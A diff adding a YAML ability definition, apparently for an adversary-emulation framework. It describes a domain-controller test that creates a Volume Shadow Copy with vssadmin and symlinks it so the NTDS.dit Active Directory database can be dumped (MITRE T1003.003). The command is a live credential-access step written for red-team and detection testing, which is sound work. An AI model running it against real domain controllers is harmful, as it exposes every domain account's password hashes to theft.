@@ -1,0 +1,21 @@
+---
+- id: f7ea25ca809e576a3b5b5b1e4dd94ea4
+  name: Create Symlink to Volume Shadow Copy
+  description: 'This test is intended to be run on a domain Controller.
+
+
+    The Active Directory database NTDS.dit may be dumped by creating a symlink to
+    Volume Shadow Copy.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      cmd:
+        command: 'vssadmin.exe create shadow /for=C: && mklink /D C:\Temp\vssstore
+          \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1'
+        payloads: []
+        cleanup: ''
